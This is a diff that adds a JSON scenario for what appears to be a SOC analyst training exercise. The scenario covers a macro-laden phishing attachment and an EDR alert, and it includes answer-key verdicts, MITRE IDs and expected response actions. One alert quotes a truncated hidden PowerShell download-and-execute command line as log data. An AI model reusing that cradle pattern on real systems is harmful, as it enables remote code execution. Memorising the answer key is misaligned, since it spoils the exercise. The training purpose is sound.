@@ -1,0 +1,147 @@
+{
+  "id": "sc-039",
+  "title": "Shift 039 - Night Shift",
+  "category": "Malware",
+  "outcome": "true_positive",
+  "difficulty": "Tier 1",
+  "briefing": "A user opened an email attachment.",
+  "startTime": "22:00:00",
+  "context": {
+    "change_calendar": [],
+    "notices": []
+  },
+  "assets": {
+    "users": {
+      "m.zaki": "FIN-PC-04"
+    }
+  },
+  "alerts": [
+    {
+      "at": 0,
+      "severity": "Medium",
+      "rule": "Email: macro-enabled attachment",
+      "source": "Email Gateway",
+      "host": "FIN-PC-04",
+      "user": "m.zaki",
+      "summary": "Macro-enabled attachment Shipment_Details.docm delivered from payroll-online-now.co",
+      "details": {
+        "email_from": "accounts@payroll-online-now.co",
+        "email_to": "m.zaki@corp.example",
+        "subject": "Your mailbox is almost full",
+        "file_name": "Shipment_Details.docm",
+        "file_hash": "24379ecf3c18b2d701a8dc3f9b4acf5755a17501087df4a3f36e726068b5d788",
+        "action_taken": "Delivered",
+        "raw_log": "mail from=accounts@payroll-online-now.co attach=Shipment_Details.docm macro=yes spf=softfail"
+      },
+      "truth": {
+        "verdict": "TP",
+        "severity": "Medium",
+        "escalate": false,
+        "mitre": "T1566.001"
+      },
+      "id": "A-1001"
+    },
+    {
+      "at": 2,
+      "severity": "Medium",
+      "rule": "EDR: Office spawned command interpreter",
+      "source": "EDR",
+      "host": "FIN-PC-04",
+      "user": "m.zaki",
+      "summary": "WINWORD.EXE spawned cmd.exe on FIN-PC-04; EDR blocked the process tree",
+      "details": {
+        "host_ip": "10.12.29.228",
+        "process": "cmd.exe",
+        "parent_process": "WINWORD.EXE",
+        "file_name": "Shipment_Details.docm",
+        "command_line": "cmd.exe /c powershell -w hidden -c IEX(New-Object Net.WebClient)...",
+        "action_taken": "Blocked (process killed)",
+        "raw_log": "EDR block parent=WINWORD.EXE child=cmd.exe host=FIN-PC-04"
+      },
+      "truth": {
+        "verdict": "TP",
+        "severity": "Medium",
+        "escalate": false,
+        "mitre": "T1059"
+      },
+      "id": "A-1002"
+    }
+  ],
+  "logs": [
+    {
+      "t": "21:56:38",
+      "src": "dns",
+      "host": "HR-PC-08",
+      "user": "o.saleh",
+      "msg": "query updates.contoso-tools.com A NOERROR"
+    },
+    {
+      "t": "21:59:23",
+      "src": "proxy",
+      "host": "EXEC-PC-31",
+      "user": "a.zaki",
+      "msg": "GET https://intranet.corp.example/home 200"
+    },
+    {
+      "t": "22:02:00",
+      "src": "edr",
+      "host": "FIN-PC-04",
+      "user": "m.zaki",
+      "msg": "Blocked: WINWORD.EXE -> cmd.exe (process tree terminated)"
+    },
+    {
+      "t": "22:02:27",
+      "src": "proxy",
+      "host": "FIN-PC-24",
+      "user": "d.farouk",
+      "msg": "GET https://cdn.fabrikam-cdn.net/lib.js 200"
+    },
+    {
+      "t": "22:12:04",
+      "src": "dns",
+      "host": "EXEC-PC-09",
+      "user": "h.samir",
+      "msg": "query updates.contoso-tools.com A NOERROR"
+    },
+    {
+      "t": "22:13:43",
+      "src": "edr",
+      "host": "IT-PC-35",
+      "user": "m.samir",
+      "msg": "Scheduled scan completed, 0 detections"
+    },
+    {
+      "t": "22:15:42",
+      "src": "proxy",
+      "host": "HR-PC-28",
+      "user": "s.khaled",
+      "msg": "GET https://mail.corp.example/owa 200"
+    },
+    {
+      "t": "22:16:10",
+      "src": "proxy",
+      "host": "ENG-PC-31",
+      "user": "m.fathy",
+      "msg": "GET https://mail.corp.example/owa 200"
+    },
+    {
+      "t": "22:28:35",
+      "src": "proxy",
+      "host": "ENG-PC-39",
+      "user": "k.mansour",
+      "msg": "GET https://cdn.fabrikam-cdn.net/lib.js 200"
+    }
+  ],
+  "iocs": {
+    "24379ecf3c18b2d701a8dc3f9b4acf5755a17501087df4a3f36e726068b5d788": {
+      "type": "hash",
+      "reputation": "malicious",
+      "note": "Malicious macro downloader document"
+    }
+  },
+  "expected_actions": [
+    "delete_email",
+    "block_hash:24379ecf3c18b2d701a8dc3f9b4acf5755a17501087df4a3f36e726068b5d788",
+    "scan_host"
+  ]
+}
